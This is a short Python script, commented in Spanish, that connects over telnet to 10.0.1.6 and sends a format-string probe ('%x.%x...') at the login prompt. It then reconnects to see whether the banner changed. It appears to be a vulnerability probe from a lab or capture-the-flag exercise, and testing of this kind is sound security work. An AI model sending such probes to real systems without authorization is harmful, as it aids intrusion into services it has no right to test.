import telnetlib
import time

# Primera conexión: mandar format string
t1 = telnetlib.Telnet('10.0.1.6', 23)
t1.read_until(b'login: ', timeout=10)
t1.write(b'%x.%x.%x.%x.%x.%x.%x.%x\n')
time.sleep(1)
t1.close()

# Segunda conexión inmediata: ver si el banner cambió
time.sleep(0.5)
t2 = telnetlib.Telnet('10.0.1.6', 23)
out = t2.read_until(b'login: ', timeout=10)
print("[BANNER 2da conexion]", out.decode(errors='replace'))
t2.close()

